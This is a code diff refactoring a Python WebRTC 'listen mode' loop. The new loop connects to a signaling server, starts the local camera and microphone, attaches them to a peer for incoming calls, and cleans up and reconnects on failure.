@@ -1,45 +1,86 @@
 # command/listen.py
-import asyncio
 
-import camera
+import asyncio
 
 from core.client import client_id, username
 from core.config import ROOM, HOST
-from signaling.handlers import DebugHandler
+
 from signaling.signal import SignalClient
+from signaling.peer import Peer
+from media.media import LocalMedia
 
 
 async def listen_mode():
-    print("[+] listen mode")
-    retry_delay = 600  # 10 minutes delay before retrying connection
+    print("[+] Listen mode")
+
+    retry_delay = 10
 
     while True:
-        signal = SignalClient(ROOM, client_id, HOST, username=username)
+        signal = None
+        media = None
 
         try:
+            # ----------------------------------
+            # Signaling
+            # ----------------------------------
+            signal = SignalClient(room=ROOM, client_id=client_id, host=HOST, username=username,)
+
             await signal.connect()
-            await camera.stream()
 
-            signal.add_handler(DebugHandler())
+            # ----------------------------------
+            # Camera / Microphone
+            # ----------------------------------
+            media = LocalMedia()
+            await media.start()
 
+            print("[+] Video Track:", media.get_video_track())
+            print("[+] Audio Track:", media.get_audio_track())
 
+            # ----------------------------------
+            # WebRTC Peer
+            # ----------------------------------
+            peer = Peer(signal)
 
-            print(f"[+] Listening as {username} ({client_id})")
+            # Send local camera/mic when a call is established
+            peer.add_media(media)
 
-            while signal.websocket is not None and not getattr(signal.websocket, "closed", False):
+            print(
+                f"[+] Listening as {username} "
+                f"({client_id})"
+            )
+
+            print("[+] Waiting for incoming offers...")
+
+            # ----------------------------------
+            # Keep process alive
+            # ----------------------------------
+            while True:
                 await asyncio.sleep(1)
 
         except asyncio.CancelledError:
             raise
 
         except Exception as exc:
-            print(f"[!] Connection failed: {exc}")
+            print(f"[!] Error: {exc}")
 
         finally:
+            print("[+] Cleaning up...")
+
             try:
-                await signal.close()
+                if media:
+                    await media.stop()
             except Exception:
                 pass
 
-        print(f"[+] Disconnected. Reconnecting in {retry_delay} seconds...")
+            try:
+                if signal:
+                    await signal.close()
+            except Exception:
+                pass
+
+        print(
+            f"[+] Reconnecting in "
+            f"{retry_delay} seconds..."
+        )
+
         await asyncio.sleep(retry_delay)
